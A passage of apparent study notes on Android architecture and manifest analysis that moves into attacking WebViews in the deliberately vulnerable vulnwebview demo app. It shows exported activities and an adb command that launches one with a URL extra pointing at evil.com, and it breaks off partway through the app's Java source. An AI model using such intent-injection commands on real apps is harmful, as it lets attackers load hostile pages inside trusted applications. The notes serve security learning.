  A[.java file] --&gt; B{Java compiler?};
  B --&gt; C[.class files];
  C --&gt; D{dex compiler};
  D --&gt; E[.dex files];</code></pre>
<ul>
<li>Core Libraries - are the tools and resources that the application code utilizes and the runtime environment provides.</li>
<li>Android Runtime(ART) written to run multiple virtual machines on low-memory devices by executing Dalvik Executable format(DEX) files it specifically designed for android.<ul>
<li>Ahead -of-time (AOT) and just-in-time (JIT) compilation<ul>
<li>AOT (All code compiled together) compilation converts code into native machine code before an app runs, providing faster startup and execution.     </li>
<li>JIT (Each code file code compiled seperatly, suitable local development) converts code to native machine code during runtime, which uses fewer resources upfront and allows for dynamic optimization based on usage.</li>
</ul>
</li>
</ul>
</li>
<li>Optimized garbage collection (GC).</li>
<li>On Android 9 (API level 28) and higher, conversion of an app package's DEX files to mapp package into a more compact representation. This change allows your app to start faster and consume less disk space and RAM.</li>
</ul>
<h5 id="libraries">Libraries</h5>
<ul>
<li>Many core Android system components and services, such as ART and HAL, are built from native code that requires native libraries written in C and C++.</li>
<li>It has Weblit for browser application, Open GL add support for drawing and manupulating 2D and 3D graphics in your app.</li>
</ul>
<h5 id="java-api-framework">Java API Framework</h5>
<ul>
<li>View system you can use to build an appâ€™s UI, including lists, grids, text boxes, buttons, and even an embeddable web browser</li>
<li>Resource manager, providing access to non-code resources such as localized strings, graphics, and layout files</li>
<li>Notification manager that enables all apps to display custom alerts in the status bar</li>
<li>Activity manager that manages the lifecycle of apps and provides a common navigation back stack</li>
<li>Content providers that enable apps to access data from other apps, such as the Contacts app, or to share their own data</li>
</ul>
<h5 id="system-apps">System Apps</h5>
<ul>
<li>User apps including Phone, Email, Message, Camers</li>
</ul>
<h2 id="androind-static-analysis">Androind Static Analysis</h2>
<ul>
<li>Every app project must have an <code>AndroidManifest.xml</code> file, with precisely that name, at the root of the project source set. The manifest file describes essential information about your app to the Android build tools, the Android operating system, and Google Play.</li>
<li>Android made up apk file, When you decompile the apk, you will get lot of files and folders. One of the file is <code>AndroidManifest.xml</code></li>
<li><code>AndroidManifest.xml</code> stores permissions, package, version, SDK, Components of applications activity</li>
</ul>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>&lt;?xml<span class="w"> </span><span class="nv">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="w"> </span><span class="nv">encoding</span><span class="o">=</span><span class="s2">&quot;utf-8&quot;</span>?&gt;
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>&lt;manifest
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="w">    </span>xmlns:android<span class="o">=</span><span class="s2">&quot;http://schemas.android.com/apk/res/android&quot;</span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="w">    </span>android:versionCode<span class="o">=</span><span class="s2">&quot;1&quot;</span>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="w">    </span>android:versionName<span class="o">=</span><span class="s2">&quot;1.0&quot;</span>&gt;
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="w">    </span>&lt;!--<span class="w"> </span>Beware<span class="w"> </span>that<span class="w"> </span>these<span class="w"> </span>values<span class="w"> </span>are<span class="w"> </span>overridden<span class="w"> </span>by<span class="w"> </span>the<span class="w"> </span>build.gradle<span class="w"> </span>file<span class="w"> </span>--&gt;
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="w">    </span>&lt;uses-sdk<span class="w"> </span>android:minSdkVersion<span class="o">=</span><span class="s2">&quot;15&quot;</span><span class="w"> </span>android:targetSdkVersion<span class="o">=</span><span class="s2">&quot;26&quot;</span><span class="w"> </span>/&gt;
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="w">    </span>&lt;application
</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="w">        </span>android:allowBackup<span class="o">=</span><span class="s2">&quot;true&quot;</span>
</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="w">        </span>android:icon<span class="o">=</span><span class="s2">&quot;@mipmap/ic_launcher&quot;</span>
</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="w">        </span>android:roundIcon<span class="o">=</span><span class="s2">&quot;@mipmap/ic_launcher_round&quot;</span>
</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="w">        </span>android:label<span class="o">=</span><span class="s2">&quot;@string/app_name&quot;</span>
</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="w">        </span>android:supportsRtl<span class="o">=</span><span class="s2">&quot;true&quot;</span>
</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a><span class="w">        </span>android:theme<span class="o">=</span><span class="s2">&quot;@style/AppTheme&quot;</span>&gt;
</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>
</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="w">        </span>&lt;!--<span class="w"> </span>This<span class="w"> </span>name<span class="w"> </span>is<span class="w"> </span>resolved<span class="w"> </span>to<span class="w"> </span>com.example.myapp.MainActivity
</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a><span class="w">             </span>based<span class="w"> </span>on<span class="w"> </span>the<span class="w"> </span>namespace<span class="w"> </span>property<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>build.gradle<span class="w"> </span>file<span class="w"> </span>--&gt;
</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a><span class="w">        </span>&lt;activity<span class="w"> </span>android:name<span class="o">=</span><span class="s2">&quot;.MainActivity&quot;</span>&gt;
</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a><span class="w">            </span>&lt;intent-filter&gt;
</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a><span class="w">                </span>&lt;action<span class="w"> </span>android:name<span class="o">=</span><span class="s2">&quot;android.intent.action.MAIN&quot;</span><span class="w"> </span>/&gt;
</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a><span class="w">                </span>&lt;category<span class="w"> </span>android:name<span class="o">=</span><span class="s2">&quot;android.intent.category.LAUNCHER&quot;</span><span class="w"> </span>/&gt;
</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a><span class="w">            </span>&lt;/intent-filter&gt;
</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a><span class="w">        </span>&lt;/activity&gt;
</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>
</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a><span class="w">        </span>&lt;activity
</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a><span class="w">            </span>android:name<span class="o">=</span><span class="s2">&quot;.DisplayMessageActivity&quot;</span>
</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a><span class="w">            </span>android:parentActivityName<span class="o">=</span><span class="s2">&quot;.MainActivity&quot;</span><span class="w"> </span>/&gt;
</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a><span class="w">    </span>&lt;/application&gt;
</span><span id="__span-0-31"><a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a>&lt;/manifest&gt;
</span></code></pre></div>
<ul>
<li><code>Activity</code> represents single screen of the UI of the application(loginActivity, cartpage.java) </li>
<li><code>Services</code> More long running process no need of UI interface, it's like spotify application audio playing in the backround.</li>
<li><code>Broadcast Receviers</code> when charging cable connected notification, Got msg notification</li>
<li><code>Content Provider</code> provides the interface of appls, gives space app data in locally or cloud.</li>
<li><code>intents</code> used for communication between 2 components 
<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>&lt;!--<span class="w"> </span>Explicit<span class="w"> </span>Intent<span class="w"> </span>Example:<span class="w"> </span>MyMainActivity<span class="w"> </span>is<span class="w"> </span>the<span class="w"> </span>entry<span class="w"> </span>point,<span class="w"> </span>typically<span class="w"> </span>launched<span class="w"> </span>explicitly<span class="w"> </span>--&gt;
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="w">        </span>&lt;activity<span class="w"> </span>android:name<span class="o">=</span><span class="s2">&quot;.MyMainActivity&quot;</span>&gt;
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">            </span>&lt;intent-filter&gt;
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="w">                </span>&lt;action<span class="w"> </span>android:name<span class="o">=</span><span class="s2">&quot;android.intent.action.MAIN&quot;</span><span class="w"> </span>/&gt;
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="w">                </span>&lt;category<span class="w"> </span>android:name<span class="o">=</span><span class="s2">&quot;android.intent.category.LAUNCHER&quot;</span><span class="w"> </span>/&gt;
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="w">            </span>&lt;/intent-filter&gt;
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="w">        </span>&lt;/activity&gt;
</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>
</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>&lt;!--<span class="w"> </span>Implicit<span class="w"> </span>Intent<span class="w"> </span>Example:<span class="w"> </span>MyShareActivity<span class="w"> </span>can<span class="w"> </span>handle<span class="w"> </span>sharing<span class="w"> </span>text<span class="w"> </span>--&gt;
</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="w">        </span>&lt;activity<span class="w"> </span>android:name<span class="o">=</span><span class="s2">&quot;.MyShareActivity&quot;</span>
</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="w">            </span>android:exported<span class="o">=</span><span class="s2">&quot;true&quot;</span>&gt;<span class="w"> </span>&lt;!--<span class="w"> </span>Required<span class="w"> </span><span class="k">for</span><span class="w"> </span>Android<span class="w"> </span><span class="m">12</span>+<span class="w"> </span><span class="k">if</span><span class="w"> </span>intent-filter<span class="w"> </span>is<span class="w"> </span>present<span class="w"> </span>--&gt;
</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="w">            </span>&lt;intent-filter&gt;
</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="w">                </span>&lt;action<span class="w"> </span>android:name<span class="o">=</span><span class="s2">&quot;android.intent.action.SEND&quot;</span><span class="w"> </span>/&gt;
</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="w">                </span>&lt;category<span class="w"> </span>android:name<span class="o">=</span><span class="s2">&quot;android.intent.category.DEFAULT&quot;</span><span class="w"> </span>/&gt;
</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="w">                </span>&lt;data<span class="w"> </span>android:mimeType<span class="o">=</span><span class="s2">&quot;text/plain&quot;</span><span class="w"> </span>/&gt;
</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="w">            </span>&lt;/intent-filter&gt;
</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a><span class="w">        </span>&lt;/activity&gt;
</span></code></pre></div><ul>
<li><code>Explicit Intent</code> specifically mentioned towards the component</li>
<li><code>Implicit Intent</code> not mentioned by us, however intent does contain other attributes which allow the android to figureout the correct intent.</li>
</ul>
</li>
</ul>
<p><img alt="Intent Filter" src="/assets/intentfilter.png" />
- Match case
<img alt="Intent Filter" src="/assets/intentfilter1.png" />
- intent filters not match Match case</p>
<h2 id="hacking-android-webviews">Hacking Android WebViews</h2>
<blockquote>
<p>WebView is a system component and a special UI element that allows an app to display web content, such as web pages or web-based applications, directly within its own interface instead of opening a seperate browser app. </p>
</blockquote>
<ul>
<li>Built on the Chromium engine, it acts as streamlined, in-app browser to render HTML, CSS and Javascript <a href="https://github.com/t4kemyh4nd/vulnwebview">Demo Application Vulnwebview</a>.</li>
<li>WebViews are commonly used for tasks like displaying user agreements, in-app login pages, or links within socail media feeds, providing a more integrated and seamless user experience.</li>
</ul>
<h3 id="webview-vulnerabilities-via-the-apps-code">WebView Vulnerabilities via the app's code ?</h3>
<ul>
<li>If developer explicitly mentions <code>android:exported=true</code>, this parameter will taken adavatage by the third-pary applications sending intent this componet is exported third-paries has access to it. </li>
</ul>
<p><div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">AndroidManifest.xml</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-2-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-2-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-2-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-2-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-2-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-2-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-2-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-2-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-2-10">10</a></span>
<span class="normal"><a href="#__codelineno-2-11">11</a></span>
<span class="normal"><a href="#__codelineno-2-12">12</a></span>
<span class="normal"><a href="#__codelineno-2-13">13</a></span>
<span class="normal"><a href="#__codelineno-2-14">14</a></span>
<span class="normal"><a href="#__codelineno-2-15">15</a></span>
<span class="normal"><a href="#__codelineno-2-16">16</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>&lt;?xml<span class="w"> </span><span class="nv">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="w"> </span><span class="nv">encoding</span><span class="o">=</span><span class="s2">&quot;utf-8&quot;</span>?&gt;
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a>&lt;manifest<span class="w"> </span>xmlns:android<span class="o">=</span><span class="s2">&quot;http://schemas.android.com/apk/res/android&quot;</span>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a><span class="w">    </span><span class="nv">package</span><span class="o">=</span><span class="s2">&quot;com.tmh.vulnwebview&quot;</span>&gt;
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4"></a><span class="w">    </span>&lt;uses-permission<span class="w"> </span>android:name<span class="o">=</span><span class="s2">&quot;android.permission.INTERNET&quot;</span><span class="w"> </span>/&gt;
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5"></a><span class="w">    </span>&lt;uses-permission<span class="w"> </span>android:name<span class="o">=</span><span class="s2">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span><span class="w"> </span>/&gt;
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6"></a><span class="w">    </span>&lt;application
</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7"></a><span class="hll"><span class="w">        </span>&lt;activity<span class="w"> </span>android:name<span class="o">=</span><span class="s2">&quot;.SupportWebView&quot;</span><span class="w"> </span>android:exported<span class="o">=</span><span class="s2">&quot;true&quot;</span><span class="w"> </span>/&gt;
</span></span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8"></a><span class="hll"><span class="w">        </span>&lt;activity<span class="w"> </span>android:name<span class="o">=</span><span class="s2">&quot;.RegistrationWebView&quot;</span><span class="w"> </span>android:exported<span class="o">=</span><span class="s2">&quot;true&quot;</span><span class="w"> </span>/&gt;
</span></span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9"></a><span class="w">        </span>&lt;activity<span class="w"> </span>android:name<span class="o">=</span><span class="s2">&quot;.MainActivity&quot;</span>&gt;
</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10"></a><span class="w">            </span>&lt;intent-filter&gt;
</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11"></a><span class="w">                </span>&lt;action<span class="w"> </span>android:name<span class="o">=</span><span class="s2">&quot;android.intent.action.MAIN&quot;</span><span class="w"> </span>/&gt;
</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12"></a><span class="w">                </span>&lt;category<span class="w"> </span>android:name<span class="o">=</span><span class="s2">&quot;android.intent.category.LAUNCHER&quot;</span><span class="w"> </span>/&gt;
</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13"></a><span class="w">            </span>&lt;/intent-filter&gt;
</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14"></a><span class="w">        </span>&lt;/activity&gt;
</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15"></a><span class="w">    </span>&lt;/application&gt;
</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16"></a>&lt;/manifest&gt;
</span></code></pre></div></td></tr></table></div>
- You can exploit this using the <code>adb shell</code> manually starting the activity.
<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1"># https://github.com/t4kemyh4nd/vulnwebview/blob/main/app/src/main/java/com/tmh/vulnwebview/RegistrationWebView.java, line 45 has reg_url</span>
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>adb<span class="w"> </span>shell<span class="w"> </span>am<span class="w"> </span>start<span class="w"> </span>-n<span class="w"> </span>com.tmh.vulnwebview.RegistrationWebView<span class="w"> </span>--es<span class="w"> </span>reg_url<span class="w"> </span><span class="s2">&quot;https://www.evil.com&quot;</span>
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="c1"># --es extra string</span>
</span></code></pre></div>
- Application code 
<div class="language-java highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">RegistrationWebView.java</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-4-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-4-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-4-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-4-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-4-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-4-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-4-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-4-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-4-10">10</a></span>
<span class="normal"><a href="#__codelineno-4-11">11</a></span>
<span class="normal"><a href="#__codelineno-4-12">12</a></span>
<span class="normal"><a href="#__codelineno-4-13">13</a></span>
<span class="normal"><a href="#__codelineno-4-14">14</a></span>
<span class="normal"><a href="#__codelineno-4-15">15</a></span>
<span class="normal"><a href="#__codelineno-4-16">16</a></span>
<span class="normal"><a href="#__codelineno-4-17">17</a></span>
<span class="normal"><a href="#__codelineno-4-18">18</a></span>
<span class="normal"><a href="#__codelineno-4-19">19</a></span>
<span class="normal"><a href="#__codelineno-4-20">20</a></span>
<span class="normal"><a href="#__codelineno-4-21">21</a></span>
<span class="normal"><a href="#__codelineno-4-22">22</a></span>
<span class="normal"><a href="#__codelineno-4-23">23</a></span>
<span class="normal"><a href="#__codelineno-4-24">24</a></span>
<span class="normal"><a href="#__codelineno-4-25">25</a></span>
<span class="normal"><a href="#__codelineno-4-26">26</a></span>
<span class="normal"><a href="#__codelineno-4-27">27</a></span>
<span class="normal"><a href="#__codelineno-4-28">28</a></span>
<span class="normal"><a href="#__codelineno-4-29">29</a></span>
<span class="normal"><a href="#__codelineno-4-30">30</a></span>
<span class="normal"><a href="#__codelineno-4-31">31</a></span>
<span class="normal"><a href="#__codelineno-4-32">32</a></span>
<span class="normal"><a href="#__codelineno-4-33">33</a></span>
<span class="normal"><a href="#__codelineno-4-34">34</a></span>
<span class="normal"><a href="#__codelineno-4-35">35</a></span>
<span class="normal"><a href="#__codelineno-4-36">36</a></span>
<span class="normal"><a href="#__codelineno-4-37">37</a></span>
<span class="normal"><a href="#__codelineno-4-38">38</a></span>
<span class="normal"><a href="#__codelineno-4-39">39</a></span>
<span class="normal"><a href="#__codelineno-4-40">40</a></span>
<span class="normal"><a href="#__codelineno-4-41">41</a></span>
<span class="normal"><a href="#__codelineno-4-42">42</a></span>
<span class="normal"><a href="#__codelineno-4-43">43</a></span>
<span class="normal"><a href="#__codelineno-4-44">44</a></span>
<span class="normal"><a href="#__codelineno-4-45">45</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="kn">package</span><span class="w"> </span><span class="nn">com.tmh.vulnwebview</span><span class="p">;</span>
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">android.os.Bundle</span><span class="p">;</span>
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">android.util.Log</span><span class="p">;</span>
</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4"></a><span class="kn">import</span><span class="w"> </span><span class="nn">android.webkit.ConsoleMessage</span><span class="p">;</span>
</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5"></a><span class="kn">import</span><span class="w"> </span><span class="nn">android.webkit.WebChromeClient</span><span class="p">;</span>
</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6"></a><span class="kn">import</span><span class="w"> </span><span class="nn">android.webkit.WebView</span><span class="p">;</span>
</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7"></a><span class="kn">import</span><span class="w"> </span><span class="nn">android.webkit.WebViewClient</span><span class="p">;</span>
</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8"></a><span class="kn">import</span><span class="w"> </span><span class="nn">androidx.appcompat.app.AppCompatActivity</span><span class="p">;</span>
</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9"></a>
</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">RegistrationWebView</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">AppCompatActivity</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11"></a>
</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12"></a><span class="w">    </span><span class="nd">@Override</span>
</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13"></a><span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">onCreate</span><span class="p">(</span><span class="n">Bundle</span><span class="w"> </span><span class="n">savedInstanceState</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14"></a><span class="w">        </span><span class="kd">super</span><span class="p">.</span><span class="na">onCreate</span><span class="p">(</span><span class="n">savedInstanceState</span><span class="p">);</span>
</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15"></a><span class="w">        </span><span class="n">setContentView</span><span class="p">(</span><span class="n">R</span><span class="p">.</span><span class="na">layout</span><span class="p">.</span><span class="na">activity_registration_web_view</span><span class="p">);</span>
</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16"></a><span class="w">        </span><span class="n">setTitle</span><span class="p">(</span><span class="s">&quot;Registration page&quot;</span><span class="p">);</span>
</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17"></a>
</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18"></a><span class="w">        </span><span class="n">loadWebView</span><span class="p">();</span>
</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20"></a>
</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">loadWebView</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22"></a><span class="w">        </span><span class="n">WebView</span><span class="w"> </span><span class="n">webView</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">findViewById</span><span class="p">(</span><span class="n">R</span><span class="p">.</span><span class="na">id</span><span class="p">.</span><span class="na">webview</span><span class="p">);</span>
</span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23"></a><span class="w">        </span><span class="n">webView</span><span class="p">.</span><span class="na">setWebChromeClient</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">WebChromeClient</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-4-24"><a id="__codelineno-4-24" name="__codelineno-4-24"></a><span class="w">            </span><span class="nd">@Override</span>
</span><span id="__span-4-25"><a id="__codelineno-4-25" name="__codelineno-4-25"></a><span class="w">            </span><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">onConsoleMessage</span><span class="p">(</span><span class="n">ConsoleMessage</span><span class="w"> </span><span class="n">consoleMessage</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-4-26"><a id="__codelineno-4-26" name="__codelineno-4-26"></a><span class="w">                </span><span class="n">Log</span><span class="p">.</span><span class="na">d</span><span class="p">(</span><span class="s">&quot;MyApplication&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">consoleMessage</span><span class="p">.</span><span class="na">message</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot; -- From line &quot;</span><span class="w"> </span><span class="o">+</span>
</span><span id="__span-4-27"><a id="__codelineno-4-27" name="__codelineno-4-27"></a><span class="w">                        </span><span class="n">consoleMessage</span><span class="p">.</span><span class="na">lineNumber</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot; of &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">consoleMessage</span><span class="p">.</span><span class="na">sourceId</span><span class="p">());</span>
</span><span id="__span-4-28"><a id="__codelineno-4-28" name="__codelineno-4-28"></a><span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
</span><span id="__span-4-29"><a id="__codelineno-4-29" name="__codelineno-4-29"></a><span class="w">            </span><span class="p">}</span>
</span><span id="__span-4-30"><a id="__codelineno-4-30" name="__codelineno-4-30"></a><span class="w">        </span><span class="p">});</span>
</span><span id="__span-4-31"><a id="__codelineno-4-31" name="__codelineno-4-31"></a>
</span><span id="__span-4-32"><a id="__codelineno-4-32" name="__codelineno-4-32"></a><span class="w">        </span><span class="n">webView</span><span class="p">.</span><span class="na">setWebViewClient</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">WebViewClient</span><span class="p">());</span>
</span><span id="__span-4-33"><a id="__codelineno-4-33" name="__codelineno-4-33"></a><span class="w">        </span><span class="c1">//Allows cross-origin requests from file:// scheme to access content from any origin</span>
